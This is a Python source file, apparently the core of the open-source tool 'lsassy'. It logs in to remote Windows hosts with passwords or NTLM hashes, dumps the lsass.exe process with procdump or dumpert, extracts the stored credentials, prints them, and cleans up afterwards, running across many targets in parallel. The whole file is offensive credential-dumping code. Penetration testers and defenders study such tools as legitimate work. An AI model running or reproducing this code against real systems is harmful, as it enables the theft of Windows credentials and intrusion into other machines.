#!/usr/bin/env python3
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

from threading import Thread, RLock

from lsassy.modules.dumper import Dumper
from lsassy.modules.impacketconnection import ImpacketConnection
from lsassy.modules.logger import Logger
from lsassy.modules.parser import Parser
from lsassy.modules.writer import Writer
from lsassy.utils.utils import *

lock = RLock()
align = 1


class Lsassy:
    def __init__(self, target, debug=False, quiet=False):
        self._log = Logger(target, get_log_spaces(target, align), is_debug=debug, is_quiet=quiet)
        self._conn = None
        self._dumper = None
        self._parser = None
        self._dumpfile = None
        self._credentials = None
        self._writer = None

    def connect(self, hostname, domain_name, username, password, hashes):
        self._conn = ImpacketConnection(hostname, domain_name, username, password, hashes)
        self._conn.set_logger(self._log)
        login_result = self._conn.login()
        if not login_result.success():
            return login_result

        self._log.info("Authenticated")
        return RetCode(ERROR_SUCCESS)

    def dump_lsass(self, options=Dumper.Options()):
        is_admin = self._conn.isadmin()
        if not is_admin.success():
            self._conn.close()
            return is_admin

        self._dumper = Dumper(self._conn, options)
        dump_result = self._dumper.dump()
        if not dump_result.success():
            return dump_result
        self._dumpfile = self._dumper.getfile()

        self._log.info("Process lsass.exe has been dumped")
        return RetCode(ERROR_SUCCESS)

    def parse_lsass(self, options=Dumper.Options()):
        self._parser = Parser(self._dumpfile, options)
        parse_result = self._parser.parse()
        if not parse_result.success():
            return parse_result

        self._credentials = self._parser.get_credentials()
        self._log.info("Process lsass.exe has been parsed")
        return RetCode(ERROR_SUCCESS)

    def write_credentials(self, options=Writer.Options()):
        self._writer = Writer(self._credentials, self._log, options)
        write_result = self._writer.write(self._conn.hostname)
        if not write_result.success():
            return write_result

        return RetCode(ERROR_SUCCESS)

    def clean(self):
        if self._parser:
            r = self._parser.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        if self._dumper:
            r = self._dumper.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        if self._conn:
            r = self._conn.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        self._log.info("Cleaning complete")

    def get_logger(self):
        return self._log


class Core(Thread):
    def __init__(self, target):
        Thread.__init__(self)
        self.dump_options = Dumper.Options()
        self.parse_options = Parser.Options()
        self.write_options = Writer.Options()
        self.target = target
        self.lsassy = None

    def set_options_from_args(self, args):
        self.dump_options.dumpname = args.dumpname
        self.dump_options.procdump_path = args.procdump
        self.dump_options.dumpert_path = args.dumpert
        self.dump_options.method = args.method
        self.dump_options.timeout = args.timeout

        self.parse_options.raw = args.raw

        if args.json:
            self.write_options.format = "json"
        elif args.grep:
            self.write_options.format = "grep"
        else:
            self.write_options.format = "pretty"

    def run(self):
        return_code = ERROR_UNDEFINED
        args = get_args()
        self.set_options_from_args(args)
        self.lsassy = Lsassy(self.target, args.debug, args.quiet)
        args.target = self.target
        try:
            return_code = self._run(args)
        except KeyboardInterrupt as e:
            print("\nQuitting gracefully...")
            return_code = RetCode(ERROR_USER_INTERRUPTION)
        except Exception as e:
            return_code = RetCode(ERROR_UNDEFINED, e)
        finally:
            self.clean()
            lsassy_exit(self.lsassy.get_logger(), return_code)

    def _run(self, args):
        """
        Extract hashes from arguments
        """

        r = self.lsassy.connect(args.target, args.domain, args.username, args.password, args.hashes)
        if not r.success():
            return r
        r = self.lsassy.dump_lsass(self.dump_options)
        if not r.success():
            return r
        r = self.lsassy.parse_lsass(self.parse_options)
        if not r.success():
            return r
        r = self.lsassy.write_credentials(self.write_options)
        if not r.success():
            return r
        return RetCode(ERROR_SUCCESS)

    def clean(self):
        if self.lsassy:
            self.lsassy.clean()


def run():
    global align
    targets = get_targets(get_args().target)
    align = get_log_max_spaces(targets)
    threads = [Core(target) for target in targets]
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == '__main__':
    run()
